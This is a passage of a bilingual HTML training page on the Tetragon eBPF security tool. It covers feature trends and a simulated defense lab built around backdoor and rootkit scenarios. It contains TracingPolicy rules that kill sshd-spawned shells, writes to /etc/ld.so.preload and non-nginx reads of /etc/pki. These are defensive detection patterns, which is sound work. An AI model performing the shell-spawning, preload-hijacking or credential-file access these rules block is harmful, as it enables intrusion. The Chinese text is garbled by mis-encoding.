    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">type</span>: <span class="yaml-val">"string"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchArgs</span>:
      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
        <span class="yaml-key">operator</span>: <span class="yaml-val">"Prefix"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/pki"</span>]
      <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"NotIn"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/bin/nginx"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>

        <div id="discovery-msg" style="display:none; text-align: center; color: var(--cisco-green); font-weight: bold;">
            <span lang="zh">âœ… ç­–ç•¥å·²æå–å¹¶å‡†å¤‡åº”ç”¨è‡³å®éªŒå®¤ï¼</span><span lang="en">âœ… Policy extracted and ready for lab application!</span>
        </div>
        <div id="sync-hint" style="display:none; text-align: center; font-size: 0.95rem; color: var(--cisco-midnight); margin-top: 25px; padding: 15px; background: rgba(108, 194, 74, 0.1); border-radius: 8px;">
        <span lang="zh">ğŸ’¡ <b>ç­–ç•¥å·²å°±ç»ªï¼š</b> æˆ‘ä»¬å·²æ ¹æ®è§‚æµ‹ç»“æœè‡ªåŠ¨ç”Ÿæˆäº†é˜²å¾¡è§„åˆ™ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬è¿›å…¥å®éªŒå®¤ï¼ŒéªŒè¯è¿™äº›â€œå†…æ ¸ç›¾ç‰Œâ€æ˜¯å¦‚ä½•æŠµå¾¡ Dark-Chain æ”»å‡»çš„ã€‚</span>
        <span lang="en">ğŸ’¡ <b>Policy Ready:</b> Defense rules have been auto-generated from observations. Let's enter the Lab to verify how these "Kernel Shields" repel Dark-Chain attacks.</span>
    </div>
    </div>
</section>
<style>
/* --- Section 5: æœ€æ–°å‘å±• ä¸“å±æ ·å¼ --- */
.trend-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
    gap: 30px;
    margin-top: 50px;
}

/* AI è„‰å†²åŠ¨æ•ˆ */
.ai-card {
    background: linear-gradient(145deg, #0D274D 0%, #005073 100%);
    color: white;
    border: none;
    overflow: hidden;
}
.ai-pulse-ring {
    position: absolute;
    top: -20px; right: -20px;
    width: 100px; height: 100px;
    border-radius: 50%;
    border: 2px solid rgba(4, 159, 217, 0.3);
    animation: ai-pulse 3s infinite;
}
@keyframes ai-pulse {
    0% { transform: scale(1); opacity: 0.8; }
    100% { transform: scale(2.5); opacity: 0; }
}

/* SBOM æ ¡éªŒå¯¹æ¯”è§†è§‰ */
.sbom-visual {
    background: rgba(255, 255, 255, 0.05);
    border-radius: var(--radius-md);
    padding: 15px;
    margin-top: 15px;
    font-family: 'SF Mono', monospace;
    font-size: 0.75rem;
}
.sbom-line { display: flex; justify-content: space-between; margin-bottom: 5px; }
.status-match { color: var(--cisco-green); font-weight: bold; }
.status-mismatch { color: var(--cisco-red); font-weight: bold; animation: blink 1s infinite; }

/* èšåˆé™å™ªå¯¹æ¯”å›¾ */
.agg-chart-mini {
    height: 60px;
    display: flex;
    align-items: flex-end;
    gap: 4px;
    margin-top: 15px;
}
.agg-bar { width: 10px; background: var(--cisco-blue); border-radius: 2px 2px 0 0; }
.agg-bar.reduced { background: var(--cisco-platinum); opacity: 0.3; }    
</style>

<section id="latest-trends" style="background: #FFFFFF; padding: 100px 0; border-bottom: 1px solid var(--cisco-platinum);">
    <div class="container">
        <p style="color: var(--cisco-orange); font-weight: 600; text-align: center; margin-bottom: 20px; letter-spacing: 2px;">
            <span lang="zh">[ 2025 æˆ˜ç•¥å‰ç» ]</span><span lang="en">[ 2025 Strategic Frontier ]</span>
        </p>

        <div class="section-header">
            <h2>
                <span lang="zh">å‰æ²¿åŠ¨æ€ï¼šä»â€œæ‰‹åŠ¨é˜²å¾¡â€èµ°å‘â€œæ™ºèƒ½å…ç–«â€</span>
                <span lang="en">Frontier Trends: From Manual Defense to Smart Immunity</span>
            </h2>
            <p style="margin-top: 20px; font-size: 1.1rem; line-height: 1.6; color: var(--cisco-slate);">
                <span lang="zh">2025 å¹´ï¼ŒTetragon çš„æ¼”è¿›è¶…è¶Šäº†ç®€å•çš„æŒ‚é’©ä¸é˜»æ–­ã€‚æˆ‘ä»¬æ­£åœ¨æ„å»ºä¸€ä¸ªå…·å¤‡è‡ªæˆ‘è¿›åŒ–èƒ½åŠ›çš„è¿è¡Œæ—¶å®‰å…¨ä¸­æ¢ï¼Œæ¶ˆé™¤ YAML ç–²åŠ³ï¼Œå¹¶å®ç°å†…æ ¸æ€çš„æ™ºèƒ½é™å™ªã€‚</span>
                <span lang="en">In 2025, Tetragon's evolution goes beyond simple hooking and blocking. We are building a self-evolving runtime security hub that eliminates YAML fatigue and implements in-kernel intelligent noise reduction.</span>
            </p>
        </div>

        <div class="trend-grid">
            <div class="card ai-card">
                <div class="ai-pulse-ring"></div>
                <div class="case-badge" style="background: var(--cisco-orange);">Intelligence</div>
                <strong><span lang="zh">Tetragon AI: æ„å›¾é©±åŠ¨å‹ç­–ç•¥</span><span lang="en">Tetragon AI: Intent-Driven Policy</span></strong>
                <p style="font-size: 0.9rem; margin-top: 15px; opacity: 0.9;">
                    <span lang="zh">å‘Šåˆ«ç¹ççš„æ‰‹å†™ YAMLã€‚Tetragon 2025 å¼•å…¥ AI è¾…åŠ©ç”Ÿæˆå¼•æ“ï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€æè¿°å®‰å…¨æ„å›¾ï¼ˆå¦‚â€œä¿æŠ¤æˆ‘çš„æ”¯ä»˜æœåŠ¡å…å—åå¼¹ Shell æ”»å‡»â€ï¼‰ï¼Œè‡ªåŠ¨è½¬æ¢ä¸ºç²¾å‡†çš„å†…æ ¸æ€ TracingPolicyã€‚</span>
                    <span lang="en">Say goodbye to tedious YAML hand-coding. Tetragon 2025 introduces an AI-assisted generation engine. Describe security intent in natural language, and it automatically converts to precise in-kernel TracingPolicy.</span>
                </p>
                <div class="yaml-block" style="background: rgba(0,0,0,0.3); border-left-color: var(--cisco-orange); margin-bottom: 0; font-size: 0.75rem;">
<span style="color: #6A9955;"># Natural Language Input:</span>
"Enforce zero-trust on all bin/sh calls"
<span style="color: #6A9955;"># AI Output:</span>
Generated Policy for sys_execve... ğŸš€</div>
            </div>

            <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                <div class="case-badge" style="background: var(--cisco-blue);">Performance</div>
                <strong><span lang="zh">å†…æ ¸æ€æ™ºèƒ½é™å™ª (Aggregation)</span><span lang="en">In-Kernel Intelligent Aggregation</span></strong>
                <p style="font-size: 0.9rem; margin-top: 15px;">
                    <span lang="zh">æå‡ SRE çš„å¹¸ç¦æ„Ÿã€‚åˆ©ç”¨ BPF Map åœ¨æ•°æ®æºå¤´è¿›è¡Œèšåˆï¼Œå°†é‡å¤çš„ã€é«˜é¢‘çš„æ— å®³äº‹ä»¶åœ¨å†…æ ¸æ€è¿›è¡Œå‹ç¼©ï¼Œä½¿ä¸ŠæŠ¥è‡³ç”¨æˆ·æ€çš„æ—¥å¿—é‡å‡å°‘äº† 95% ä»¥ä¸Šã€‚</span>
                    <span lang="en">Empowering SREs. Utilizing BPF Maps for aggregation at the data source, high-frequency harmless events are compressed in-kernel, reducing log volume reported to user-space by over 95%.</span>
                </p>
                <div class="agg-chart-mini">
                    <div class="agg-bar" style="height: 100%;"></div>
                    <div class="agg-bar reduced" style="height: 10%;"></div>
                    <div class="agg-bar" style="height: 90%;"></div>
                    <div class="agg-bar reduced" style="height: 5%;"></div>
                    <div class="agg-bar" style="height: 80%;"></div>
                    <div class="agg-bar reduced" style="height: 8%;"></div>
                    <span style="font-size: 0.6rem; color: #888; margin-left: 10px;">(95% Noise Reduced)</span>
                </div>
            </div>

            <div class="card" style="border-top: 4px solid var(--cisco-green);">
                <div class="case-badge" style="background: var(--cisco-green);">Forward-Looking</div>
                <strong><span lang="zh">2025 é¡¶æµç‰¹æ€§ï¼šSBOM åŠ¨æ€éªŒè¯</span><span lang="en">2025 Top Feature: Dynamic SBOM Verification</span></strong>
                <p style="font-size: 0.9rem; margin-top: 15px;">
                    <span lang="zh">ä»â€œèº«ä»½â€åˆ°â€œæŒ‡çº¹â€çš„è·¨è¶Šã€‚Tetragon åœ¨å†…æ ¸æ€å®æ—¶æå–æ‰§è¡Œç¨‹åºçš„å“ˆå¸Œï¼Œå¹¶ä¸é•œåƒ SBOM è®°å½•è¿›è¡ŒäºŒè¿›åˆ¶æ¯”å¯¹ï¼Œç¡®ä¿æ²¡æœ‰ä»»ä½•ä¾›åº”é“¾æŠ•æ¯’åçš„â€œå˜å¼‚ä»£ç â€èƒ½è¿è¡Œã€‚</span>
                    <span lang="en">The leap from "Identity" to "Fingerprint." Tetragon extracts real-time execution hashes in-kernel and performs binary comparison with SBOM records to ensure no "mutated code" from supply chain attacks can run.</span>
                </p>
                
                <div class="sbom-visual">
                    <div class="sbom-line"><span>Binary Path:</span> <span>/usr/bin/nginx</span></div>
                    <div class="sbom-line"><span>SBOM Hash:</span> <span>8f2a...3e4f</span></div>
                    <div class="sbom-line"><span>Runtime Hash:</span> <span class="status-mismatch">d41b...a1b2</span></div>
                    <div style="text-align: right; margin-top: 5px; color: var(--cisco-red); font-weight: bold;">[ACTION: SIGKILL]</div>
                </div>
            </div>
        </div>
        
        <div class="architect-note" style="margin-top: 50px;">
            <strong><span lang="zh">ğŸ” æ¶æ„å¸ˆç¬”è®°ï¼šæ¶ˆé™¤â€œYAML ç–²åŠ³â€</span><span lang="en">ğŸ” Architect's Note: Eliminating "YAML Fatigue"</span></strong>
            <p>
                <span lang="zh">Tetragon çš„æœªæ¥ä¸ä»…åœ¨äºå®ƒèƒ½æ•è·ä»€ä¹ˆï¼Œè€Œæ˜¯åœ¨äºå®ƒå¦‚ä½•é™ä½å®‰å…¨å›¢é˜Ÿçš„è®¤çŸ¥è´Ÿè½½ã€‚é€šè¿‡ AI è¾…åŠ©å’Œå†…æ ¸æ€èšåˆï¼Œæˆ‘ä»¬å°†ä»â€œæµ·é‡è­¦æŠ¥çš„ç›‘æ§è€…â€è½¬å˜ä¸ºâ€œå®‰å…¨æ„å›¾çš„ç¼–æ’è€…â€ã€‚</span>
                <span lang="en">Tetragon's future lies not just in what it can capture, but in how it reduces cognitive load. Through AI assistance and in-kernel aggregation, we pivot from "monitors of alerts" to "orchestrators of security intent."</span>
            </p>
        </div>
    </div>
</section>
<style>
    /* --- 2. å®éªŒå®¤ä¸“å±ç»„ä»¶æ ·å¼ --- */
    .section-header { text-align: center; max-width: 850px; margin: 0 auto 60px; }
    .section-header h2 { font-size: 2.25rem; margin-bottom: 16px; position: relative; display: inline-block; color: var(--cisco-midnight); }
    .section-header h2::after {
        content: ''; display: block; width: 60px; height: 4px; background: var(--cisco-blue);
        margin: 12px auto 0; border-radius: 2px;
    }

    .mechanism-card {
        background: #FFFFFF; border: 1px solid var(--cisco-platinum);
        border-radius: 12px; padding: 35px; margin-bottom: 40px;
        box-shadow: var(--shadow-card); position: relative;
    }

    .case-badge { 
        background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
        color: white; padding: 5px 16px; border-radius: 50px; font-size: 0.75rem; 
        font-weight: 700; margin-bottom: 15px; display: inline-block; 
        text-transform: uppercase; letter-spacing: 1.2px;
    }

    /* çŠ¶æ€æŒ‡ç¤ºç¯æ ·å¼ */
    .enforcement-status {
        position: absolute; top: 35px; right: 35px;
        padding: 4px 12px; border-radius: 4px; font-size: 0.7rem; font-weight: bold;
        display: flex; align-items: center; gap: 6px;
        background: #EEE; color: #888; border: 1px solid #DDD;
    }
    .enforcement-status.active { background: rgba(4, 159, 217, 0.1); color: var(--cisco-blue); border-color: var(--cisco-blue); }
    .status-dot { width: 6px; height: 6px; border-radius: 50%; background: #888; }
    .enforcement-status.active .status-dot { background: var(--cisco-blue); box-shadow: 0 0 8px var(--cisco-blue); animation: pulse-dot 1.5s infinite; }
    @keyframes pulse-dot { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

    /* ç»ˆç«¯æ ·å¼ */
    .terminal {
        background: #111111; border-radius: var(--radius-md); overflow: hidden;
        font-family: 'Courier New', monospace; box-shadow: 0 20px 50px rgba(0,0,0,0.3); margin-top: 20px;
        border: 1px solid #333; position: relative;
    }
    .terminal-bar { background: #2A2A2A; padding: 12px; display: flex; gap: 8px; align-items: center; }
    .traffic-light { width: 12px; height: 12px; border-radius: 50%; }
    .traffic-light.red { background: #ff5f56; }
    .traffic-light.yellow { background: #ffbd2e; }
    .traffic-light.green { background: #27c93f; }
    .terminal-content { padding: 20px; min-height: 200px; color: #EEE; font-size: 14px; }
    .prompt { color: var(--cisco-green); font-weight: bold; }
    .cursor { display: inline-block; width: 10px; height: 18px; background: #CCC; animation: blink 1s infinite; vertical-align: middle; }
    @keyframes blink { 50% { opacity: 0; } }

    /* é€‰é¡¹å¡æ ·å¼ */
    .tab-container { margin: 20px 0; }
    .tab-header { display: flex; gap: 10px; margin-bottom: 15px; }
    .tab-btn { 
        padding: 8px 20px; border-radius: 20px; border: 1px solid var(--cisco-platinum); 
        background: white; cursor: pointer; font-weight: 600; color: var(--cisco-slate);
    }
    .tab-btn.active { background: var(--cisco-midnight); color: white; border-color: var(--cisco-midnight); }
    /* --- Scenario ä¸“ç”¨æ ·å¼è¿˜åŸ --- */
    .mitre-tag {
        font-size: 0.7rem;
        background: rgba(4, 159, 217, 0.1);
        color: var(--cisco-blue);
        padding: 3px 8px;
        border-radius: 4px;
        font-weight: bold;
        display: inline-flex;
        align-items: center;
        gap: 4px;
        margin-left: 10px;
        border: 1px solid rgba(4, 159, 217, 0.2);
    }

    .yaml-block {
        background: #1E1E1E; border-radius: var(--radius-md); padding: 24px;
        font-family: 'Consolas', monospace; font-size: 0.9rem; color: #D4D4D4;
        border-left: 4px solid var(--cisco-green); overflow-x: auto; white-space: pre; margin: 20px 0;
    }
    .yaml-key { color: #569CD6; font-weight: bold; }
    .yaml-val { color: #CE9178; }
    .yaml-action { color: #C586C0; font-weight: bold; }

    /* ç›¾ç‰Œæ°´å°åŠ¨ç”» */
    .shield-watermark {
        position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
        width: 150px; height: 150px; opacity: 0; pointer-events: none;
        z-index: 1; transition: opacity 0.5s;
    }
    .shield-watermark svg { fill: rgba(108, 194, 74, 0.1); }
    .shield-active .shield-watermark { opacity: 1; }
/* å¢é‡ CSSï¼šæ¶æ„å¸ˆç¬”è®°ç»„ä»¶ */
.architect-note {
    background: rgba(4, 159, 217, 0.04);
    border: 1px solid rgba(4, 159, 217, 0.2);
    border-left: 4px solid var(--cisco-blue);
    padding: 15px 20px;
    margin: 15px 0;
    border-radius: var(--radius-md);
}
.architect-note strong {
    color: var(--cisco-midnight);
    font-size: 0.85rem;
    display: block;
    margin-bottom: 5px;
}
.architect-note p {
    font-size: 0.85rem;
    color: var(--cisco-slate);
    margin: 0;
    line-height: 1.5;
}    
</style>
<section id="lab-section" style="background: #F9FAFB; padding: 80px 0;">
    <div class="container">
        <p style="color: var(--cisco-blue); font-weight: 600; text-align: center; margin-bottom: 20px;">
            <span lang="zh">[ 4/4: å®æˆ˜æ¼”ç»ƒ ]</span><span lang="en">[ 4/4: Hands-on Lab ]</span>
        </p>

        <div class="section-header">
            <h2>
                <span lang="zh">å®æ—¶æ”»é˜²æ¼”ç»ƒå®éªŒå®¤</span><span lang="en">Real-Time Threat Defense Lab</span>
            </h2>
            <p>
                <span lang="zh">æ²‰æµ¸å¼ä½“éªŒå†…æ ¸çº§å¨èƒé˜»æ–­ã€‚è¯·åœ¨ä¸‹æ–¹å®éªŒåœºæ™¯ä¸­ç‚¹å‡»â€œå¯åŠ¨æ¼”ç»ƒâ€ã€‚</span><span lang="en">Immersive experience of kernel-level threat enforcement. Click "Start Lab" in the scenarios below.</span>
            </p>
        </div>

        <div style="background: #FFF; border: 1px solid var(--cisco-blue); padding: 20px; border-radius: 8px; margin-bottom: 30px; text-align: center;">
            <p style="margin:0; font-weight: bold; color: var(--cisco-midnight);">
                â€œHear and you forget; see and you remember; DO and you understand.â€ 
            </p>
            <p style="margin:5px 0 0; font-size: 0.85rem; color: #666;">
                <span lang="zh">æ²‰æµ¸å¼ä½“éªŒå†…æ ¸çº§å¨èƒé˜»æ–­ã€‚è¯·æŒ‰é¡ºåºæ‰§è¡Œæ”»å‡»æ¨¡æ‹Ÿï¼Œè§‚å¯Ÿ Tetragon çš„å®æ—¶é˜²å¾¡åŠ¨ä½œã€‚</span><span lang="en">Experience kernel-level threat blocking. Execute attack simulations in order to observe Tetragon's real-time enforcement.</span>
            </p>
        </div>

        <div class="mechanism-card" id="card-scenario-0">
            <div class="enforcement-status" id="status-0">
                <div class="status-dot"></div>
                <span class="status-text">MODE: MONITORING</span>
            </div>
            
            <div class="case-badge" style="background: var(--cisco-midnight);">Scenario 0</div>
            <h4 style="border-left: 4px solid var(--cisco-midnight); padding-left: 15px; color: var(--cisco-midnight); font-size: 1.4rem; margin-bottom: 15px;">
                <span lang="zh">Tetragon éƒ¨ç½²ä¸ç­–ç•¥ä¸‹å‘</span><span lang="en">Tetragon Deployment & Policy Distribution</span>
            </h4>

            <div class="view-section">
                <p>
                    <span lang="zh">åœ¨å¼€å§‹é˜²å¾¡ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å°† Tetragon æ³¨å…¥åˆ°åŸºç¡€è®¾æ–½ä¸­ã€‚Tetragon æ”¯æŒå¤šç§ç¯å¢ƒï¼Œèƒ½å¤Ÿæ— ç¼æ„ŸçŸ¥äº‘åŸç”Ÿä¸Šä¸‹æ–‡ã€‚</span><span lang="en">Before enforcement begins, we need to inject Tetragon into the infrastructure. Tetragon supports diverse environments and seamlessly senses cloud-native contexts.</span>
                </p>
                
                <div class="tab-container">
                    <div class="tab-header">
                        <button class="tab-btn active" id="btn-tab-k8s" onclick="switchSetupTab('k8s')">
                            <span lang="zh">Kubernetes (Helm)</span><span lang="en">Kubernetes (Helm)</span>
                        </button>
                        <button class="tab-btn" id="btn-tab-linux" onclick="switchSetupTab('linux')">
                            <span lang="zh">Linux åŸç”Ÿ (Binary)</span><span lang="en">Native Linux (Binary)</span>
                        </button>
                    </div>
                </div>

                <div id="setup-description">
                    <div id="setup-k8s" class="setup-detail">
                        <p>
                            <strong><span lang="zh">Kubernetes éƒ¨ç½²ï¼š</span><span lang="en">Kubernetes Deployment:</span></strong>
                            <span lang="zh">é€šè¿‡ Helm ä»“åº“å®‰è£…ã€‚Tetragon ä¼šä»¥ DaemonSet å½¢å¼è¿è¡Œåœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šï¼Œè‡ªåŠ¨æŒ‚è½½ eBPF ç¨‹åºå¹¶ç›‘å¬ API Serverã€‚</span><span lang="en">Installed via Helm. Tetragon runs as a DaemonSet on each node, automatically mounting eBPF programs and listening to the API Server.</span>
                        </p>
                    </div>
                    <div id="setup-linux" class="setup-detail" style="display:none;">
                        <p>
                            <strong><span lang="zh">Linux åŸç”Ÿéƒ¨ç½²ï¼š</span><span lang="en">Native Linux Deployment:</span></strong>
                            <span lang="zh">é€‚ç”¨äºéå®¹å™¨åŒ–ç¯å¢ƒæˆ–è¾¹ç¼˜èŠ‚ç‚¹ã€‚ç›´æ¥è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€šè¿‡æœ¬åœ° YAML æ–‡ä»¶ä¸‹å‘ç­–ç•¥ï¼Œåˆ©ç”¨ systemd ä¿è¯æŒä¹…è¿è¡Œã€‚</span><span lang="en">Ideal for non-containerized environments or edge nodes. Run the binary directly with local YAML policies, managed via systemd for persistence.</span>
                        </p>
                    </div>
                </div>
            </div>

            <div style="display: flex; gap: 12px; margin-top: 15px;">
                <button class="btn-primary" onclick="runSetupSimulation()" id="setupBtn" style="background: var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
                    <span lang="zh">æ‰§è¡Œå®‰è£…ä¸ç­–ç•¥ä¸‹å‘</span><span lang="en">Execute Install & Policy</span>
                </button>
                <button class="btn-outline" onclick="resetTerminal('setupOutput')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
                    <span lang="zh">æ¸…ç©ºç»ˆç«¯</span><span lang="en">Clear Terminal</span>
                </button>
            </div>

            <div class="terminal" id="term-wrap-0">
                <div class="terminal-bar">
                    <div class="traffic-light red"></div>
                    <div class="traffic-light yellow"></div>
                    <div class="traffic-light green"></div>
                </div>
                <div class="terminal-content" id="setupOutput">
                    <div class="login-info" style="color: #888; font-size: 0.8rem; margin-bottom: 12px;">
                        Infrastructure Console Initialized...
                    </div>
                    <div>
                        <span class="prompt">admin@infra:~$</span> <span class="cursor"></span>
                    </div>
                </div>
            </div>
        </div>
<div class="mechanism-card" id="card-scenario-1">
    <div class="enforcement-status" id="status-1"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
    <div class="case-badge">Scenario I</div>
    <span class="mitre-tag">MITRE T1195.002</span>
    <h4 style="color: var(--cisco-midnight); font-size: 1.4rem; margin-bottom: 15px;">
        <span lang="zh">åˆå§‹è®¿é—®ï¼šä¾›åº”é“¾åé—¨æ‹¦æˆª</span><span lang="en">Initial Access: Supply Chain Backdoor Interception</span>
    </h4>
    <div class="view-section">
        <p>
            <strong><span lang="zh">æ”»å‡»åŸç†ï¼šIFUNC åŠ«æŒã€‚</span><span lang="en">Attack Principle: IFUNC Hijacking.</span></strong> 
            <span lang="zh">Dark-Chain åˆ©ç”¨ XZ æ¼æ´ï¼Œåœ¨ SSH è®¤è¯è¿‡ç¨‹ä¸­é€šè¿‡å†…å­˜é’©å­ç»•è¿‡ RSA æ£€æŸ¥ã€‚ç”±äºæ”»å‡»ä¸äº§ç”Ÿæ–°è¿›ç¨‹ï¼Œä¼ ç»Ÿ Agent æ— æ³•æ„ŸçŸ¥ã€‚</span><span lang="en">Dark-Chain exploits the XZ vulnerability to bypass RSA checks via memory hooks during SSH authentication. Since the attack creates no new processes, traditional agents remain blind.</span>
        </p>
        <p>
            <strong><span lang="zh">Tetragon å¯¹ç­–ï¼š</span><span lang="en">Tetragon Response:</span></strong> 
            <span lang="zh">ç›‘æ§ <code>sshd</code> è¿›ç¨‹çš„å¼‚å¸¸å­è¿›ç¨‹æ´¾ç”Ÿã€‚åªè¦åé—¨å°è¯•æ´¾ç”Ÿ Shellï¼ŒTetragon åœ¨å†…æ ¸æ€æ„ŸçŸ¥è¯¥è¡Œä¸ºå¹¶ç«‹å³æ‰§è¡Œ SIGKILLã€‚</span><span lang="en">Monitoring abnormal child process spawning of the <code>sshd</code> process. As soon as the backdoor attempts to spawn a shell, Tetragon detects it in-kernel and executes SIGKILL instantly.</span>
        </p>
    </div>
    <div class="yaml-block"><span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-sshd-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/sbin/sshd"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
      <div class="architect-note">
    <strong><span lang="zh">ğŸ” æ¶æ„å¸ˆç¬”è®°ï¼šæ¶ˆé™¤å®¡è®¡å™ªå£°</span><span lang="en">ğŸ” Architect's Note: Eliminating Noise</span></strong>
    <p>
        <span lang="zh">æ­¤ç­–ç•¥çš„ä»·å€¼ä¸ä»…åœ¨äºé˜»æ–­ï¼Œæ›´åœ¨äºå…¶äº§ç”Ÿçš„ JSON å…·å¤‡<b>â€œç¡®å®šæ€§è¯­ä¹‰â€</b>ã€‚ç›¸æ¯”ä¼ ç»Ÿ EDR äº§ç”Ÿçš„æµ·é‡è¿›ç¨‹æ ‘æ—¥å¿—ï¼Œè¯¥æ—¥å¿—ç›´æ¥æ ‡è®°ä¸º <code>SIGKILL</code>ï¼Œä½¿å¾— SOC å›¢é˜Ÿèƒ½ç¬é—´åŒºåˆ†â€œåˆæ³•çš„ç®¡ç†æ“ä½œâ€ä¸â€œä¾›åº”é“¾æ”»å‡»è§¦å‘çš„åé—¨è¡Œä¸ºâ€ã€‚</span>
        <span lang="en">The value here isn't just enforcement; it's <b>"Deterministic Semantics."</b> Unlike verbose EDR process trees, these logs explicitly flag a <code>SIGKILL</code>, enabling SOC teams to instantly distinguish legitimate admin tasks from supply-chain backdoor triggers.</span>
    </p>
</div>
    <div style="display: flex; gap: 12px; margin-top: 15px;">
        <button class="btn-primary" onclick="runLabPhase(1)" id="labBtn1" style="background: var(--cisco-blue); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">å¯åŠ¨æ¼”ç»ƒ</span><span lang="en">Start Lab</span>
        </button>
        <button class="btn-outline" onclick="resetTerminal('labOut1')" style="background: transparent; border: 1px solid var(--cisco-blue); color: var(--cisco-blue); padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
            <span lang="zh">é‡ç½®ç»ˆç«¯</span><span lang="en">Reset Terminal</span>
        </button>
    </div>
    <div class="terminal" id="term-wrap-1">
        <div class="shield-watermark"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
        <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
        <div class="terminal-content" id="labOut1">
            <div class="login-info" style="color: #888; font-size: 0.8rem; margin-bottom: 12px;">Last login: Today from 192.168.1.5</div>
            <div><span class="prompt">root@prod-db:~#</span> <span class="cursor"></span></div>
        </div>
    </div>
</div>

<div class="mechanism-card" id="card-scenario-2">
    <div class="enforcement-status" id="status-2"><div class="status-dot"></div><span class="status-text">MODE: MONITORING</span></div>
    <div class="case-badge">Scenario II</div>
    <span class="mitre-tag">MITRE T1014</span>
    <h4 style="color: var(--cisco-midnight); font-size: 1.4rem; margin-bottom: 15px;">
        <span lang="zh">æŒä¹…åŒ–ï¼šRootkit æ¤å…¥é˜»æ–­</span><span lang="en">Persistence: Rootkit Implant Interception</span>
    </h4>
    <div class="view-section">
        <p>
            <strong><span lang="zh">æ”»å‡»åŸç†ï¼šåŠ«æŒ ld.so.preloadã€‚</span><span lang="en">Attack Principle: Hijacking ld.so.preload.</span></strong> 
            <span lang="zh">æ”»å‡»è€…å°è¯•ä¿®æ”¹ç³»ç»Ÿé¢„åŠ è½½è·¯å¾„ï¼Œå°†æ¶æ„ <code>.so</code> æ–‡ä»¶æ³¨å…¥æ‰€æœ‰è¿›ç¨‹ç©ºé—´ã€‚è¿™æ˜¯ Dark-Chain å®ç°éšèº«çš„å…³é”®æ­¥éª¤ã€‚</span><span lang="en">Attackers attempt to modify the system preload path to inject malicious <code>.so</code> files into all process spaces. This is a critical step for Dark-Chain to achieve invisibility.</span>
        </p>
        <p>
            <strong><span lang="zh">Tetragon å¯¹ç­–ï¼š</span><span lang="en">Tetragon Response:</span></strong> 
            <span lang="zh">é”å®š <code>/etc/ld.so.preload</code> çš„å†™æƒé™ã€‚ä»»ä½•éæˆæƒè¿›ç¨‹å°è¯• open/write è¯¥æ–‡ä»¶éƒ½ä¼šè§¦å‘ SIGKILLã€‚</span><span lang="en">Locking write access to <code>/etc/ld.so.preload</code>. Any unauthorized process attempting to open or write to this file will trigger a SIGKILL.</span>
        </p>
    </div>
    <div class="yaml-block"><span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"protect-ld-preload"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">args</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">type</span>: <span class="yaml-val">"string"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchArgs</span>:
      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
        <span class="yaml-key">operator</span>: <span class="yaml-val">"Equal"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/ld.so.preload"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
    <div style="display: flex; gap: 12px; margin-top: 15px;">
        <button class="btn-primary" onclick="runLabPhase(2)" id="labBtn2" style="background: var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;">
